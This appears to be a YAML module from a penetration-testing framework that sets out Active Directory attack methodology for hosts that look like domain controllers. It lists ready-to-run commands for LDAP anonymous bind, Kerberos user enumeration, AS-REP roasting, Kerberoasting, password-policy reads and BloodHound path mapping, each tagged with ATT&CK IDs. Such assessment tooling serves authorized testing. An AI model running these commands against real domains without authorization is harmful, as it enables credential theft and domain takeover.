# Active Directory Module

LDAP/Kerberos/AD methodology. Runs once per host that shows domain-controller
indicators (`condition: is_dc`). `{domain}` is a placeholder for the operator.

```yaml
module: active_directory
title: Active Directory
scope: host
condition: is_dc
summary: "Active Directory / domain-controller methodology."
finding_keywords: [ldap, kerberos, smb, ms17-010]
finding_categories: [Directory, "Vuln scan"]
attack_surface:
  - when: "always"
    note: "Host shows domain-controller indicators (Kerberos/LDAP services or DC naming)."
  - when: "always"
    note: "Domain context — credential exposure here can escalate to domain-wide access."
techniques_extra: [T1003.006]
checks:
  - {name: LDAP anonymous bind,    attack: T1087.002, command: "ldapsearch -x -H ldap://{ip} -s base namingContexts",
     purpose: "Test anonymous bind; read base DSE / naming contexts."}
  - {name: Domain user enumeration, attack: T1087.002, command: "kerbrute userenum -d {domain} --dc {ip} users.txt",
     purpose: "Validate usernames via Kerberos pre-auth responses."}
  - {name: AS-REP roasting,        attack: T1558.004, command: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile users.txt -no-pass -format hashcat",
     purpose: "Find accounts without Kerberos pre-auth (offline cracking)."}
  - {name: Kerberoasting,          attack: T1558.003, command: "GetUserSPNs.py {domain}/<user>:<pass> -dc-ip {ip} -request -outputfile spn.hashes",
     purpose: "List/request SPN tickets for offline cracking."}
  - {name: Password policy,        attack: T1201,     command: "rpcclient -U '<user>%<pass>' {ip} -c getdompwinfo",
     purpose: "Read lockout/complexity policy before any spraying."}
  - {name: Attack-path mapping,    attack: T1482,     command: "bloodhound-python -d {domain} -u <user> -p <pass> -dc {label} -c All",
     purpose: "Collect AD objects/ACLs to map privilege paths."}
```
